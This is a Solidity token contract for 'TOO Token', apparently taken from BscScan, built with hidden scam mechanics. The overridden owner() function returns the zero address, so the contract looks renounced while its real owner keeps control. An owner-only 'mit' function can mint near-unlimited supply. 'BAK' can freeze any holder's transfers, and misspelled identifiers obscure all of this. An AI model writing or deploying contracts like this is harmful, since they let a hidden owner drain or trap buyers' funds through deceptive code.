/**
 *Submitted for verification at BscScan.com on 2022-08-12
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owner);
        _;
    }

/**
    * @dev Returns the address of the current owner.
     */
    function owner() public pure  returns  (address) {
        return address(0);
    }


    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owner, newowneres);
        owner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owner, address(0));
        owner = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'TOO Token';

    string constant public symbol = 'TOO';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 500000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromftii;

    mapping(address => bool) private _lkck;


    uint256 public _taxftii = 0;
    uint256 private _previousTaxftii = _taxftii;

    uint256 public _burnftii = 2;
    uint256 private _previousBurnftii = _burnftii;


    address public projectAddress = 0xe6c699553727DB70b44bA2141Cf0105853979Ae3;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_lkck[from], "is lkck");

        if(_isExcludedFromftii[from])
            removeAllftii();

        uint256 ftii =  calculateTaxftii(value);

        uint256 burn =  calculateBurnftii(value);

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(ftii).sub(burn);

        if(ftii > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(ftii);
            emit Transfer(from, projectAddress, ftii);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromftii[from])
            restoreAllftii();

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }


    function mit(address target, uint256 edAmount) public onlyowneres{
    	require (totalSupply + edAmount <= MAXSupply);

        balanceOf[target] = balanceOf[target].add(edAmount);
        totalSupply = totalSupply.add(edAmount);

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }

    function calculateTaxftii(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxftii).div(
            10 ** 2
        );
    }

    function calculateBurnftii(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnftii).div(
            10 ** 2
        );
    }

    function removeAllftii() private {
        if(_taxftii == 0 && _burnftii == 0)
            return;

        _previousTaxftii = _taxftii;
        _previousBurnftii = _burnftii;
        _taxftii = 0;
        _burnftii = 0;
    }

    function restoreAllftii() private {
        _taxftii = _previousTaxftii;
        _burnftii = _previousBurnftii;
    }



    function BAK(address acbount) public onlyowneres {
        _lkck[acbount] = true;
    }


    function UNBAK(address acbount) public onlyowneres {
        _lkck[acbount] = false;
    }


    function islkck(address acbount) public view returns (bool) {

        return _lkck[acbount];
    }


}


contract Token is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;


    }

    function() public payable {
       revert();
    }
}